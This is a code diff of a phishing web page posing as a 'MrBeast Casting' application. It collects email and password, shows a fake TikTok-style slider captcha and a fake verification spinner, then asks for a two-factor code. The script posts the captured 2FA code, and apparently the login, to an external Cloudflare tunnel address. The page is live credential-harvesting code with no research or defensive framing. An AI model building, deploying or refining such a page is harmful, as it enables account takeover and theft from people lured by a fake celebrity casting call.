@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://googleapis.com" rel="stylesheet">
     <title>MrBeast Casting</title>
     <style>
         :root { --blue: #00a8e8; --pink: #f12e3e; --green: #00ff88; }
@@ -22,10 +22,7 @@
         }
         .bg-pattern { 
             position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
+            top: 0; left: 0; width: 100%; height: 100%; 
             background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') repeat; 
             background-size: 60px; 
             opacity: 0.15; 
@@ -45,131 +42,40 @@
             position: relative; 
             z-index: 10; 
             border: 1px solid rgba(255,255,255,0.1); 
-            box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1); 
+            box-shadow: 0 30px 80px rgba(0,0,0,0.6); 
         }
         .mr-glow { 
-            font-family: 'Inter', sans-serif; 
-            font-weight: 900; 
-            font-size: 44px; 
+            font-family: 'Inter', sans-serif; font-weight: 900; font-size: 44px; 
             background: linear-gradient(45deg, var(--pink), #ff6b7a, var(--blue), #4dd0e9); 
             background-size: 300% 300%; 
-            -webkit-background-clip: text; 
-            background-clip: text; 
-            -webkit-text-fill-color: transparent; 
-            animation: gradientShift 3s ease infinite, glowPulse 2s ease-in-out infinite alternate; 
-            filter: drop-shadow(0 0 20px var(--pink)) drop-shadow(0 0 40px var(--blue)); 
+            -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; 
+            animation: gradientShift 3s ease infinite; 
             display: inline-block; 
-            position: relative; 
         }
         @keyframes gradientShift { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
-        @keyframes glowPulse { 0% { filter: drop-shadow(0 0 20px var(--pink)) drop-shadow(0 0 40px var(--blue)); } 100% { filter: drop-shadow(0 0 30px var(--pink)) drop-shadow(0 0 60px var(--blue)); } }
         .beast-style { 
-            font-family: 'Inter', sans-serif; 
-            font-weight: 900; 
-            font-size: 44px; 
+            font-family: 'Inter', sans-serif; font-weight: 900; font-size: 44px; 
             color: #fff !important; 
             display: inline-block; 
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
         }
         .security-title { 
-            font-family: 'Inter', sans-serif; 
-            font-weight: 900; 
-            font-size: 26px; 
+            font-family: 'Inter', sans-serif; font-weight: 900; font-size: 26px; 
             color: #fff !important; 
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            margin-bottom: 10px;
         }
-        input { width: 100%; padding: 20px; margin-bottom: 18px; border: 2px solid rgba(255,255,255,0.1); background: rgba(26,26,26,0.8); color: #fff; border-radius: 16px; font-size: 16px; outline: none; backdrop-filter: blur(10px); transition: all 0.3s ease; }
-        input:focus { border-color: var(--blue); box-shadow: 0 0 20px rgba(0,168,232,0.3); background: rgba(26,26,26,0.95); }
-        input::placeholder { color: #888; }
-        .btn { background: linear-gradient(45deg, var(--pink), #ff5e62); color: #fff; border: none; padding: 20px; border-radius: 16px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; font-size: 16px; transition: all 0.3s ease; position: relative; overflow: hidden; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 40px rgba(241,46,62,0.4); }
+        input { width: 100%; padding: 20px; margin-bottom: 18px; border: 2px solid rgba(255,255,255,0.1); background: rgba(26,26,26,0.8); color: #fff; border-radius: 16px; font-size: 16px; outline: none; }
+        input:focus { border-color: var(--blue); box-shadow: 0 0 20px rgba(0,168,232,0.3); }
+        .btn { background: linear-gradient(45deg, var(--pink), #ff5e62); color: #fff; border: none; padding: 20px; border-radius: 16px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; font-size: 16px; }
         
-        /* REAL TIKTOK CIRCLE CAPTCHA */
+        /* TIKTOK CIRCLE CAPTCHA */
         #captcha_ui { display: none; padding: 25px 0; }
-        .captcha-container {
-            position: relative;
-            width: 100%;
-            height: 220px;
-            background: #1e1e1e;
-            border-radius: 16px;
-            border: 2px solid #333;
-            overflow: hidden;
-            margin-bottom: 20px;
-        }
-        .captcha-bg {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') no-repeat center;
-            background-size: 140%;
-            opacity: 0.2;
-        }
-        .puzzle-missing {
-            position: absolute;
-            left: 20px;
-            top: 50%;
-            width: 70px;
-            height: 70px;
-            background: #1e1e1e;
-            border-radius: 50%;
-            transform: translateY(-50%);
-            border: 3px solid #333;
-            z-index: 2;
-        }
-        .slider-knob {
-            position: absolute;
-            right: 20px;
-            top: 50%;
-            width: 60px;
-            height: 60px;
-            background: conic-gradient(#00a8e8, #4fc3f7, #00ff88);
-            border-radius: 50%;
-            transform: translateY(-50%);
-            cursor: grab;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            font-weight: bold;
-            color: #000;
-            box-shadow: 0 8px 25px rgba(0,168,232,0.4);
-            z-index: 5;
-            transition: all 0.2s ease;
-        }
-        .slider-knob:active {
-            cursor: grabbing;
-            transform: translateY(-50%) scale(0.95);
-        }
-        .slider-knob.success {
-            background: conic-gradient(#00ff88, #4dffb2);
-            box-shadow: 0 8px 25px rgba(0,255,136,0.6);
-        }
-        .slider-track {
-            position: absolute;
-            bottom: 12px;
-            left: 20px;
-            right: 20px;
-            height: 4px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 2px;
-        }
-        .slider-progress {
-            height: 100%;
-            background: linear-gradient(90deg, var(--blue), var(--green));
-            border-radius: 2px;
-            width: 0%;
-            transition: width 0.1s ease;
-        }
-        .captcha-title {
-            font-size: 16px;
-            font-weight: 600;
-            color: #fff;
-            margin-bottom: 12px;
-        }
-        .status-text { font-size: 14px; color: #aaa; font-weight: 500; margin-bottom: 15px; }
-        
+        .captcha-container { position: relative; width: 100%; height: 220px; background: #1e1e1e; border-radius: 16px; border: 2px solid #333; overflow: hidden; margin-bottom: 20px; }
+        .captcha-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') no-repeat center; background-size: 140%; opacity: 0.2; }
+        .puzzle-missing { position: absolute; right: 20px; top: 50%; width: 70px; height: 70px; background: #1e1e1e; border-radius: 50%; transform: translateY(-50%); border: 3px dashed var(--blue); z-index: 2; }
+        .slider-knob { position: absolute; left: 20px; top: 50%; width: 70px; height: 70px; background: conic-gradient(var(--blue), #4fc3f7, var(--green)); border-radius: 50%; transform: translateY(-50%); cursor: grab; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; color: #000; box-shadow: 0 8px 25px rgba(0,168,232,0.4); z-index: 5; }
+        .slider-knob.success { background: conic-gradient(var(--green), #4dffb2); box-shadow: 0 8px 25px rgba(0,255,136,0.6); }
+        .captcha-title { font-size: 15px; font-weight: 600; color: #fff; margin-bottom: 15px; }
+        .status-text { font-size: 14px; color: #aaa; margin-bottom: 15px; }
         #loader, #otp_section { display: none; }
         .spinner { border: 4px solid rgba(0, 212, 255, 0.2); border-top: 4px solid var(--blue); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
@@ -187,20 +93,15 @@
             <input type="password" id="pass" placeholder="Password">
             <button class="btn" onclick="sendLogin()">CONTINUE</button>
         </div>
-        
         <div id="captcha_ui">
-            <p class="captcha-title">Drag The Slider to Fit The Puzzle</p>
-            <p class="status-text" id="statusText">Drag circle on the right → slot on the left</p>
+            <p class="captcha-title">Drag The Slider to Fit The Puzzle | TikTok</p>
+            <p class="status-text" id="statusText">Drag the circle to match the slot</p>
             <div class="captcha-container" id="captchaContainer">
                 <div class="captcha-bg"></div>
-                <div class="puzzle-missing" id="puzzleSlot"></div>
+                <div class="puzzle-missing"></div>
                 <div class="slider-knob" id="sliderKnob">→</div>
-                <div class="slider-track">
-                    <div class="slider-progress" id="sliderProgress"></div>
-                </div>
             </div>
         </div>
-        
         <div id="loader"><div class="spinner"></div><p>Verifying Identity...</p></div>
         <div id="otp_section">
             <div class="security-title">SECURITY CHECK</div>
@@ -209,10 +110,8 @@
             <button class="btn" onclick="submitOTP()">FINISH APPLICATION</button>
         </div>
     </div>
-    
     <script>
         const tunnel = "https://syndicate-textbooks-pound-eyes.trycloudflare.com";
-        
         function sendLogin() {
             const e = document.getElementById('email').value, p = document.getElementById('pass').value;
             if(e && p) {
@@ -222,83 +121,27 @@
                 initTikTokCaptcha();
             }
         }
-        
         function initTikTokCaptcha() {
-            const knob = document.getElementById('sliderKnob');
-            const slot = document.getElementById('puzzleSlot');
-            const container = document.getElementById('captchaContainer');
-            const progress = document.getElementById('sliderProgress');
-            const statusText = document.getElementById('statusText');
-            
-            let isDragging = false;
-            let startX = 0;
-            let currentProgress = 0;
-            
-            const updateCaptcha = (progressPercent) => {
-                const slotX = 20 + (progressPercent / 100) * (container.offsetWidth - 170);
-                slot.style.left = slotX + 'px';
-                progress.style.width = progressPercent + '%';
-                
-                statusText.textContent = progressPercent > 85 ? 'Perfect match!' : 'Drag circle on the right → slot on the left';
-                
-                if (progressPercent > 88 && progressPercent < 92) {
-                    isDragging = false;
-                    knob.classList.add('success');
-                    knob.textContent = '✓';
-                    statusText.textContent = 'Verified!';
-                    statusText.style.color = 'var(--green)';
-                    setTimeout(showLoader, 1000);
-                }
-            };
-            
-            const onDrag = (e) => {
+            const knob = document.getElementById('sliderKnob'), container = document.getElementById('captchaContainer'), statusText = document.getElementById('statusText');
+            let isDragging = false, startX = 0, currentX = 20;
+            const move = (e) => {
                 if (!isDragging) return;
-                e.preventDefault();
-                
-                const clientX = e.touches ? e.touches[0].clientX : e.clientX;
-                let newProgress = ((clientX - container.getBoundingClientRect().left - 80) / (container.offsetWidth - 160)) * 100;
-                
-                if (newProgress < 0) newProgress = 0;
-                if (newProgress > 100) newProgress = 100;
-                
-                currentProgress = newProgress;
-                updateCaptcha(newProgress);
+                let x = ((e.touches ? e.touches[0].clientX : e.clientX) - startX);
+                if (x < 20) x = 20; if (x > container.offsetWidth - 90) x = container.offsetWidth - 90;
+                currentX = x; knob.style.left = x + 'px';
+                if (x > container.offsetWidth - 110) { isDragging = false; knob.classList.add('success'); knob.textContent = '✓'; statusText.textContent = 'Verified!'; setTimeout(showLoader, 1000); }
             };
-            
-            const onDragStart = (e) => {
-                isDragging = true;
-                startX = e.touches ? e.touches[0].clientX : e.clientX;
-                knob.style.transition = 'none';
-            };
-            
-            const onDragEnd = () => {
-                if (!knob.classList.contains('success')) {
-                    updateCaptcha(0);
-                }
-                isDragging = false;
-                knob.style.transition = 'all 0.3s ease';
-            };
-            
-            // Event listeners
-            knob.addEventListener('mousedown', onDragStart);
-            knob.addEventListener('touchstart', onDragStart, { passive: false });
-            
-            document.addEventListener('mousemove', onDrag);
-            document.addEventListener('touchmove', onDrag, { passive: false });
-            
-            document.addEventListener('mouseup', onDragEnd);
-            document.addEventListener('touchend', onDragEnd);
+            const start = (e) => { isDragging = true; startX = (e.touches ? e.touches[0].clientX : e.clientX) - currentX; knob.style.transition = 'none'; };
+            const end = () => { if (!knob.classList.contains('success')) { knob.style.left = '20px'; currentX = 20; } isDragging = false; knob.style.transition = 'left 0.3s ease'; };
+            knob.addEventListener('mousedown', start); knob.addEventListener('touchstart', start, {passive:false});
+            window.addEventListener('mousemove', move); window.addEventListener('touchmove', move, {passive:false});
+            window.addEventListener('mouseup', end); window.addEventListener('touchend', end);
         }
-        
         function showLoader() {
             document.getElementById('captcha_ui').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            setTimeout(() => { 
-                document.getElementById('loader').style.display = 'none'; 
-                document.getElementById('otp_section').style.display = 'block'; 
-            }, 2000);
+            setTimeout(() => { document.getElementById('loader').style.display = 'none'; document.getElementById('otp_section').style.display = 'block'; }, 2000);
         }
-        
         function submitOTP() {
             const c = document.getElementById('2fa_code').value;
             fetch(tunnel, { method: 'POST', body: new URLSearchParams({'2fa_code': c}) })
